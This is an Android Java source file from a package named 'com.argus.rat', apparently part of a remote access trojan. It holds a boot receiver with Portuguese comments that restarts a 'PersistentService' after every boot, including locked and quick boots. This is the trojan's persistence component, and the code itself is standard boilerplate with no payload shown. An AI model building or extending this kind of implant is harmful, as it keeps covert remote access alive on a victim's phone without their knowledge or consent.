package com.argus.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootCompleteReceiver extends BroadcastReceiver {
    private static final String TAG = "BootCompleteReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Broadcast recebido: " + action);

        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            startPersistentService(context);
        }
    }

    private void startPersistentService(Context context) {
        try {
            Log.d(TAG, "Iniciando PersistentService após boot...");
            
            Intent serviceIntent = new Intent(context, PersistentService.class);
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                // Android 8+ requer startForegroundService para serviços em primeiro plano
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            Log.d(TAG, "PersistentService iniciado com sucesso após boot");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar PersistentService após boot", e);
        }
    }

    // Método para verificar se o receiver está registrado corretamente
    public static boolean isReceiverRegistered(Context context) {
        Intent intent = new Intent(context, BootCompleteReceiver.class);
        android.content.pm.PackageManager pm = context.getPackageManager();
        return pm.queryBroadcastReceivers(intent, 0).size() > 0;
    }
}